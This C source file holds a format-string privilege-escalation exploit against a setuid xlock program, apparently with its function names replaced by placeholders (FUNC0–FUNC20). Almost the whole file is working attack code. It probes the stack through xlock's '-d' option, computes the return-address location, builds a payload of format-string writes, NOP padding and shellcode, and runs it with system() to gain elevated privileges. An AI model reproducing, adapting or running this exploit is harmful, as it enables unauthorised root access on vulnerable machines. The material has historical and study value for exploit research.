#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct stat {int st_mode; } ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int BIGBREAKFAST ; 
 int CMDSIZE ; 
 int FMTSIZE ; 
 int OFFSET ; 
 int S_ISUID ; 
 int S_IXOTH ; 
 char* XLOCK_PATH ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  errno ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (char*,int,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,int,int) ; 
 char* FUNC7 (int,int,unsigned long,unsigned long) ; 
 int /*<<< orphan*/ * FUNC8 (char*,char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  FUNC11 (char*,char*,char*,char*) ; 
 int FUNC12 (char*,struct stat*) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*) ; 
 int /*<<< orphan*/  FUNC14 (char*,int /*<<< orphan*/ ) ; 
 int FUNC15 (char*) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*) ; 
 char* FUNC17 (char*,char*) ; 
 unsigned long FUNC18 (char*,int /*<<< orphan*/ *,int) ; 
 int FUNC19 (char*) ; 

int FUNC20(int argc, char **argv){
    FILE *fp;
    char output[65536];
    char fmtstr[FMTSIZE];
    char command[CMDSIZE];
    int i;
    char *p;
    int prebuf;
    int breakfast;
    unsigned long int location;
    unsigned long int value;
    int shellcode_size = sizeof shellcode;
    int offset = OFFSET;
    struct stat f;

    i = FUNC12(XLOCK_PATH, &f);
    if (i) FUNC1(1, errno, "whereis xlock?");
    if (!(f.st_mode & S_IXOTH)) FUNC1(1, 0, "executable?");
    if (!(f.st_mode & S_ISUID)) FUNC1(1, 0, "not setuid");

    if (argc > 1) {
        offset = FUNC0(argv[1]);
    }

    /*
     * Setup a format string to analyse the stack.
     */
    
    FUNC6(output, 0, 65536);
    FUNC6(fmtstr, 0x20, FMTSIZE);

    for (i = 0, p = fmtstr; i < BIGBREAKFAST; i++) {    
        FUNC5(p, "%.8x ", 5);
        p += 5;
    }

    /* 
     * blank out 10 bytes - the first two %.8x's.
     * this makes space for the prebuf bytes and token.
     */

    FUNC6(fmtstr, 0x20, 10);   
    fmtstr[FMTSIZE - 1] = 0x00;
    
    /*
     *  Find the number of prebuf bytes (0x03's)to word align.        
     *  0 to 3 bytes may be needed to shove the token
     *  01010101 of the fmt str onto a word boundary.
     */

    i = 0;
    do {
        prebuf = i;
        FUNC6(fmtstr, 0x03, i);  
        FUNC6(fmtstr + i, 0x01, 4);
        FUNC11(command, "%s -d '%s' 2>&1", XLOCK_PATH, fmtstr);
        fp = FUNC8(command, "r");
        FUNC6(output, 0, 65536);
        FUNC3(output, 1024, 64, fp);
        FUNC2(fp);
#if DEBUG
        printf("======== trying prebuf %d =======\n%s", i, output);
#endif
        i++;
    } while (!FUNC16(output, "01010101") && i < 4); /* prebuf bytes always less than 4 */

    if (prebuf == 4){
        FUNC1(1, 0, "could not find fmt str on the stack");
    }


    FUNC6(output, 0x20, 40);   /* clear the 'xlock: unable to open display' */
    p = FUNC17(output, "\x20"); /* get A */

    /*
     * Store error()'s base ptr value in var location.
     * Then find fprintf()'s ret by subracting offset.
     */

    location = FUNC18(p, NULL, 16);
    location -= offset;
    value = location                /* fprintf's ret */
            + 12                    /* 3 words to error's bp */
            + breakfast * 4         /* breakfast words to fmt str */ 
            + FMTSIZE               /* to end of fmt str */
            - shellcode_size        /* to start of shellcode */
            - 100;                  /* position in the NOPS for safe measure */

    /*
     * Walk down the output string looking for 01010101,
     * counting how whole many words eaten to get there.
     */

    for (breakfast = 1; ; breakfast++) {
        p = FUNC17(NULL, "\x20");
        if (!p) FUNC1(1, 0, "reached end of output string and no 01010101");
#if DEBUG
        printf("eat %d to reach %s\n", breakfast, p);
#endif
        if (!FUNC13(p, "01010101")) break;
    }


    /*
     * make the exploit fmt str.
     */

    p = FUNC7(prebuf, breakfast, location, value);
    FUNC6(fmtstr, 0x90, FMTSIZE);
    FUNC5(fmtstr, p, FUNC15(p));
    FUNC4(p);
    p = (char *) &fmtstr[FMTSIZE - shellcode_size];
    FUNC14(p, shellcode);

    FUNC11(command, "%s -d '%s'", XLOCK_PATH, fmtstr);

#if DEBUG
    puts("====== command line ======");
    printf("%s\n", command);
    puts("====== end command  ======");

#endif

    FUNC10("====== system() ======");
    i = FUNC19(command);
    FUNC10("====== end system ======");

    FUNC9("\nsystem() returned %d\n", i);
    FUNC9("prebuf was %d bytes\n", prebuf);
    FUNC9("breakfast was %d words\n", breakfast);
    FUNC9("location was %.8lx\n", location);
    FUNC9("value was %.8lx\n", value);

    FUNC10("exiting.");
    return 0;
}